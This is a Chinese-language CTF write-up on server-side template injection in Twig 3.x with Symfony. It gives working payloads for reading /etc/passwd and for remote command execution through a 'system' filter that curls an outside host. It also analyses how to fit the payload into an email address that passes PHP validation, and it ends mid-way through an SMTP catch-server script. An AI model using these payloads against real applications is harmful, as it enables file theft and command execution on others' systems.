# TWIG 3.x with symfony SSTI
上周末做了volgactf, 里面有道twig
的模板注入还是比较有意思的，我瞅了一天多想找RCE的链，但是由于菜没找到，队友不到一个多小时找到了读任意文件的方法。队友太强了.jpg 我菜爆了.jpg
先看结论: twig 3.x with symfony ssti 有两种利用方式（单独twig无法利用下面的方法）
  * 任意文件读取
    * `{{'/etc/passwd'|file_excerpt(-1,-1)}}`
  * RCE
    * `{{app.request.query.filter(0,'curl${IFS}x.x.x.x:8090',1024,{'options':'system'})}}`
## 题目描述
题目链接
题目给了源码
    render('main.twig');
        }
        public function subscribe(Request $request, MailerInterface $mailer)
        {
          $msg = '';
          $email = filter_var($request->request->get('email', ''), FILTER_VALIDATE_EMAIL);
          if($email !== FALSE) {
            $name = substr($email, 0, strpos($email, '@'));
            $content = $this->get('twig')->createTemplate(
              "Hello ${name}.Thank you for subscribing to our newsletter.Regards, VolgaCTF Team"
            )->render();
            $mail = (new Email())->from('PI:EMAIL')->to($email)->subject('VolgaCTF Newsletter')->html($content);
            $mailer->send($mail);
            $msg = 'Success';
          } else {
            $msg = 'Invalid email';
          }
          return $this->render('main.twig', ['msg' => $msg]);
        }
        public function source()
        {
            return new Response(''.htmlspecialchars(file_get_contents(__FILE__)).'');
        }
    }
通过源码可以看到，传一个邮件地址，然后截取@前面的username，插入到模板，造成模板注入。
首先一个合法的email地址是什么样的？
一种方法就是去翻rfc
从上图可以看到local-part 可以是Quoted-string，双引号中间的内容QcontentSMTP，可以是\x32-\x126
也可以是32-126 的ascci 中间不能包含`"`（32） `\`(92).
那么我们就可以得出一个结论：合法的email地址可以是 `"` \+ 非双引号，非反斜杠 `"`
另一种方法是去翻php源码
    ^(?!(?:(?:\x22?\x5C[\x00-\x7E]\x22?)|(?:\x22?[^\x5C\x22]\x22?)){255,})(?!(?:(?:\x22?\x5C[\x00-\x7E]\x22?)|(?:\x22?[^\x5C\x22]\x22?)){65,}@)(?:(?:[\x21\x23-\x27\x2A\x2B\x2D\x2F-\x39\x3D\x3F\x5E-\x7E]+)|(?:\x22(?:[\x01-\x08\x0B\x0C\x0E-\x1F\x21\x23-\x5B\x5D-\x7F]|(?:\x5C[\x00-\x7F]))*\x22))(?:\.(?:(?:[\x21\x23-\x27\x2A\x2B\x2D\x2F-\x39\x3D\x3F\x5E-\x7E]+)|(?:\x22(?:[\x01-\x08\x0B\x0C\x0E-\x1F\x21\x23-\x5B\x5D-\x7F]|(?:\x5C[\x00-\x7F]))*\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\]))$
好像不太好看懂！决定正面搞一下那个表达式
`x(?!y)`
> 仅仅当'x'后面不跟着'y'时匹配'x'，这被称为正向否定查找。
>
> 例如，仅仅当这个数字后面没有跟小数点的时候，/\d+(?!.)/
> 匹配一个数字。正则表达式/\d+(?!.)/.exec("3.141")匹配‘141’而不是‘3.141’
`(?:x)`
> 匹配 'x' 但是不记住匹配项。这种括号叫作 _非捕获括号_ ，使得你能够定义与正则表达式运算符一起使用的子表达式。看看这个例子
> `/(?:foo){1,2}/`。如果表达式是 `/foo{1,2}/`，`{1,2}` 将只应用于 'foo' 的最后一个字符
> 'o'。如果使用非捕获括号，则 `{1,2}` 会应用于整个 'foo' 单词
找到了一个网站 可以进行可视化显示  
意思是开头
  * 不能超过255个第一个虚线框里面的字符
  * 不能超过65个第二个虚线框里面的字符+@
手动测试一下，正常情况下最大程度是64
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"@c.om
下面不行 不满足开头不是65+@的情况
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"@c.om
但是可以通过`""."xxxxx"@x.com` 或者 `"xxxx".""@x.com` 来绕过64的限制  
虽然php源码里判断了最大长度是320,由于255的限制我觉得@前最大长度也就是254.
测试发现总体最大的长度是258，`@c.c` 还需要四个
我们来验证一下  
除了上面的绕法之外还有一种绕过长度64的方法
     这个临时邮箱支持自定义用户名
  2. 自己搭建STMP服务器
    from __future__ import print_function
    from datetime import datetime
    import asyncore
    from smtpd import SMTPServer
    class EmlServer(SMTPServer):
        no = 0
        def process_message(self, peer, mailfrom, rcpttos, data, mail_options=None,rcpt_options=None):
            filename = '%s-%d.eml' % (datetime.now().strftime('%Y%m%d%H%M%S'),
                    self.no)
            f = open(filename, 'wb')
            print(data)
            f.write(data)
            f.close
            print('%s saved.' % filename)
            self.no += 1
    def run():
        foo = EmlServer(('0.0.0.0', 25), None)
        try:
            asyncore.loop()
        except KeyboardInterrupt:
            pass
    if __name__ == '__main__':